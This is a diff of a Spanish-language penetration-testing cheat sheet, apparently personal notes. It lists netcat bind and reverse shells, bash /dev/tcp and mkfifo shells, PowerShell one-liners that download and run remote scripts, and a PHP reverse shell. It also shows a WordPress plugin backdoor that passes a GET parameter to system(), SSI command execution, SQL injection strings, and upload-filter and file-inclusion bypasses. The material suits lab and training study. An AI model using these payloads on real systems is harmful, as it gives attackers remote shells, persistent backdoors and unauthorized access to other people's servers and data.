@@ -1,48 +1,32 @@
-Webserver con webdav -> cadaver [url]
-	Dentro del webserver, para subir archivos -> put [ubicación]
-
-Transferencia de archivos
+#NC-FTP
+**Transferencia de archivos**
     nc -lvp [puerto] > [archivo a guardar]
     nc -vv [ip] [puerto] < [archivo]
 
 
-Conectarte a programa y redireccionar salida por nc
+**Conectarte a programa y redireccionar salida por nc**
     nc -lvvp [puerto] -e/-c cmd.exe
     nc -v [ip] [puerto]
 
 
-Conectar programa a servidor en escucha y redireccionar salida por nc
+**Conectar programa a servidor en escucha y redireccionar salida por nc**
     nc -lvvp [puerto]
     nc -v [ip] [puerto] -e/-c /bin/bash
-    
-Ejecutar comando tras conectar nc
+
+
+**Ejecutar comando tras conectar nc**
 	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)/ -e (lo ejecuta exec)
 
-Descargar todo de ftp
+**Descargar todo de ftp**
 	wget -m --no-passive ftp://anonymous:anonymous@IP
 
-Hydra ->
-	hydra -l/-L user/userList -P dicc.lst -s PUERTO -f (cuando encuentra un resultado para) -t THREADS -vV URL http-get/post-form "/Path/:username=^USER^&password=^PASS^:Mensaje error"
-	
-acccheck -t [IP target] -u [username]/ -U [usernames file] -p [password]/ -P [passwords file] (Prueba credenciales para inicio de sesión remota)
-
-smbclient -U [username] -L [IP target]
-	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
-	put [archivo] (sube el archivo al directorio del ordenador víctima)
-
-SNMP ->
-	Metasploit -> 	auxiliary/scanner/snmp/snmp_login
-			auxiliary/scanner/snmp/snmp_enum
-			
-	snmpwalk -v 1(o la que sea) -c public(community name de snmp_login) IP
-	
-
-Reverse shell
+#Reverse shell
     Recibida con nc -vvv -n -l -p PUERTO
     bash -i >& /dev/tcp/IP_DESTINO/NUM_PUERTO 0>&1
     bash -c "bash -i >& /dev/tcp/IP Atacante/Puerto Atacante 0>&1"
+    mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe Para crear bind nc
     ---
-    Para RCE en web
+    **Para RCE en web**
     mknod /tmp/backpipe p
     /bin/sh 0</tmp/backpipe | nc IP PUERTO 1>/tmp/backpipe
     O probar también
@@ -56,11 +40,37 @@ Reverse shell
     0<&196;exec 196<>/dev/tcp/IP/PUERTO; sh <&196 >&196 2>&196&		(el & final la pone en background)
     exec 5<>/dev/tcp/IP/PUERTO cat <&5 | while read line; do $line 2>&5 >&5; done&		(el & final la pone en background)
 
-	WINDOWS:
+	**WINDOWS:**
 		powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
 		powershell -c "IEX(New-Object System.Net.WebClient).DownloadString (‘http://IP/p.ps1’); p.ps1 -c IP -p PORT -e cmd"
 
-Conectarse por mysql
-	mysql -uUSUARIO -pPASSWORD -h HOST
-	
+  **SHELL PHP FUNCIONAL LINUX**
+    <?php
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/IP-NUESTRA/PUERTO-NUESTRO 0>&1'");
+     ?>
 
+  **Wordpress**
+  	Editar hello.php de Hello Dolly y agregar
+  		if($_GET['cmd']) {
+  		  system($_GET['cmd']);
+  		  }
+
+
+  **Conectarse por mysql**
+  	mysql -uUSUARIO -pPASSWORD -h HOST
+
+#WEB
+curl -T [archivo a subir] [IP target] (Prueba si está habilitado PUT para subir un archivo a la IP mandada)
+curl --cookie "[cookie]" --location "[url que queramos ejecutar]"
+Si introducimos la url que aparece al hacer un Command Injection o SQL Injection con --data (capturándola con Burp por ejemplo) podemos hacer curl también y redirigir la salida haciendo | tee archivo.txt
+También podemos hacer login poniendo la cookie de sesión y el index del sitio una vez se inicia sesión
+En la consola del navegador, document.cookie="cookie que queramos usar" para hacer login como otro usuario
+En formularios, si el valor de lo que se introduce está en texto plano html, se puede modificar desde el debugger del navegador y mandar el formulario de nuevo
+Con SSI (Server Side Includes), siempre que sea archivo shtml podemos ejecutar comandos remotos en el formulario como <!--#exec cmd="ls ../../"-->
+Probar en usuarios y contraseñas ' or 1=1;--
+Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo
+Para bypassear filtro de extensión, poner .nuevaExtension
+Para bypassear filtro MIME, para imagen poner GIF al inicio de la shell
+php://filter/convert.base64-encode/resource=index
+Para formularios que usen XML user:pass del tipo user=X and pass=Y:
+	-> '(false) or 1=1(true) or 'a'='a(true) // and false de la pass
